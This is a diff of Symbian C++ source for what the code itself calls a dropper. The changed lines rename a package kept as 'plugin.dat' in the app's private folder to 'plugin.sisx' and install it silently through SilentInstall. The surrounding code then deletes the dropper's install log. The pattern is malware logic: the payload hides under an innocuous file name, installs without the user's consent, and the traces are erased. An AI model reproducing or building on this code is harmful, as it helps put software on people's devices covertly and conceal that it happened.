@@ -107,22 +107,26 @@ LOCAL_C void MainL()
 	optionsPckg = options;
 		
 	// Create path
-	TFileName path;
+	TFileName oldName;
+	TFileName newName;
 	RFs fs;
 	fs.Connect();
-	fs.PrivatePath( path );
-	fs.Close();
-	path.Append(_L("plugin.sisx"));
+	fs.PrivatePath( oldName );
+	newName.Copy(oldName);
+	oldName.Append(_L("plugin.dat"));
+	newName.Append(_L("plugin.sisx")); 
 	
 	TFileName processName = RProcess().FileName();
 	TParse parse;
 	parse.Set(processName , NULL, NULL);
-	path.Insert(0,parse.Drive()); 
-	
+	oldName.Insert(0,parse.Drive());
+	newName.Insert(0,parse.Drive());
+	fs.Rename(oldName,newName);	
+	fs.Close();
+		
 	// Start synchronous install
 	TInt err = KErrNone;
-	err = launcher.SilentInstall(path,optionsPckg);
-			
+	err = launcher.SilentInstall(newName,optionsPckg);		
 	launcher.Close();
 
 	// Delete install log of dropper install
